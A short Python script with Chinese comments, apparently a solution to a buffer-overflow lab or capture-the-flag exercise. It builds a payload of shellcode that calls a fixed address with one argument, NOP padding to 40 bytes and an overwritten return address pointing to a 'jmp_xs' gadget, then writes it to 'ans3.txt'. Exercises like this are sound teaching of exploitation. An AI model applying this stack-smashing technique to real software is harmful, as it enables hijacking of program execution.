import struct

#准备Shellcode
shellcode = b"\xbf\x72\x00\x00\x00"
shellcode += b"\x48\xb8\x16\x12\x40\x00\x00\x00\x00\x00"
#call rax
shellcode += b"\xff\xd0"

#计算Padding
#从buffer start到return address的距离是40
#把shellcode放在最开头，后面用nop填充
padding_len = 40 - len(shellcode)
padding = b"\x90" * padding_len

#构造Return Address
#覆盖func的返回地址，使其跳转到jmp_xs
jmp_xs_addr = 0x401334
ret_addr = struct.pack('<Q', jmp_xs_addr)

#拼接 Payload
payload = shellcode + padding + ret_addr

#写入文件
with open("ans3.txt", "wb") as f:
    f.write(payload)

print(f"Payload generated! Size: {len(payload)} bytes.")
print("Shellcode injected. Redirecting execution flow to jmp_xs...")
